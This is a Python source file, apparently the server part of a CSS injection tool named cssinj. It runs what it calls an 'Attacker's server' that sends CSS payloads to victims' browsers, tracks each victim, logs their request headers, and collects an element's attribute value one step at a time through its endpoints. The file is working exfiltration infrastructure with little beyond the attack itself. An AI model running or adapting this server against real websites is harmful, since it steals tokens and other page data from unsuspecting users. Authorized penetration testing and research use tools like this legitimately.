import asyncio

from aiohttp import web

from cssinj.client import Client
from cssinj.console import Console
from cssinj.strategies import get_strategy
from cssinj.utils.dom import Attribut, Element
from cssinj.utils.error import InjectionError


class Server:
    def __init__(self, clients, args, output_file):
        self.hostname = args.hostname
        self.port = args.port
        self.element = args.element
        self.attribut = args.attribut
        self.show_details = args.details
        self.method = args.method
        self.clients = clients
        self.output_file = output_file
        self.complete = args.complete
        self.structure = args.structure
        self.app = web.Application(middlewares=[self.error_middleware, self.dynamic_router_middleware])

        # Instantiate the strategy
        StrategyClass = get_strategy(args.method)
        self.strategy = StrategyClass(
            hostname=self.hostname,
            port=self.port,
            element=self.element,
            attribut=self.attribut,
        )

    async def start(self):
        self.runner = web.AppRunner(self.app)
        await self.runner.setup()

        site = web.TCPSite(self.runner, self.hostname, self.port)
        await site.start()
        Console.log("server", f"Attacker's server started on {self.hostname}:{self.port}")
        while True:
            await asyncio.sleep(3600)

    async def stop(self):
        Console.log("server", "Attacker's server cleaning up.")
        if self.runner:
            await self.runner.cleanup()
        Console.log("server", "Attacker's server stopped.")

    async def handle_start(self, request):
        client = Client(
            host=request.remote,
            accept=request.get("accept"),
            headers=dict(request.headers),
            event=asyncio.Event(),
        )
        self.clients.append(client)
        if self.output_file:
            self.output_file.update()
        Console.log("connection", f"Connection from {client.host}")
        Console.log("connection_details", f"ID : {client.id}")
        client.event.set()

        if self.show_details:
            for key, value in request.headers.items():
                Console.log("connection_details", f"{key} : {value}")

        return web.Response(
            text=self.strategy.generate_start_payload(client),
            content_type="text/css",
        )

    async def handle_end(self, request):
        client_id = request.query.get("cid")

        client = self.clients[client_id]

        if client is None:
            raise InjectionError("Unknown client id")

        element = Element(name=self.element)
        element.attributs.append(Attribut(name=self.attribut, value=client.data))
        client.elements.append(element)
        if self.output_file:
            self.output_file.update()

        client.event.set()

        Console.log(
            "end_exfiltration",
            f"[{client.id}] - The {self.attribut} exfiltrated from {self.element} is : {client.data}",
        )

        client.data = ""

        return web.Response(
            text=self.strategy.handle_end(client),
            content_type="text/css",
        )

    async def handle_next(self, request):
        client_id = request.query.get("cid")
        client = self.clients[client_id]

        if client is None:
            raise InjectionError("Unknown client id")

        client.counter += 1

        await client.event.wait()

        client.event.clear()

        return web.Response(
            text=self.strategy.generate_next_payload(client),
            content_type="text/css",
        )

    async def handle_valid(self, request):
        client_id = request.query.get("cid")
        client = self.clients[client_id]

        if client is None:
            raise InjectionError("Unknown client id")

        client.event.set()
        client.data = request.query.get("t")

        if self.output_file:
            self.output_file.update()

        if self.show_details:
            Console.log(
                "exfiltration",
                f"[{client.id}] - Exfiltrating element: {client.data}",
            )

        return web.Response(text=self.strategy.handle_valid(client, request.query.get("t")), content_type="text/css")

    async def dynamic_router_middleware(self, app, handler):
        async def middleware_handler(request):
            path = request.path

            if path.startswith("/start"):
                return await self.handle_start(request)
            elif path.startswith("/n"):
                return await self.handle_next(request)
            elif path.startswith("/v"):
                return await self.handle_valid(request)
            elif path.startswith("/e"):
                return await self.handle_end(request)
            return web.Response(text="404: Not Found", status=404)

        return middleware_handler

    @web.middleware
    async def error_middleware(self, request, handler):
        try:
            response = await handler(request)
            return response
        except Exception as ex:
            Console.error_handler(ex, context={"source": "middleware"})
            return web.Response(text="500: Internal Server Error", status=500)
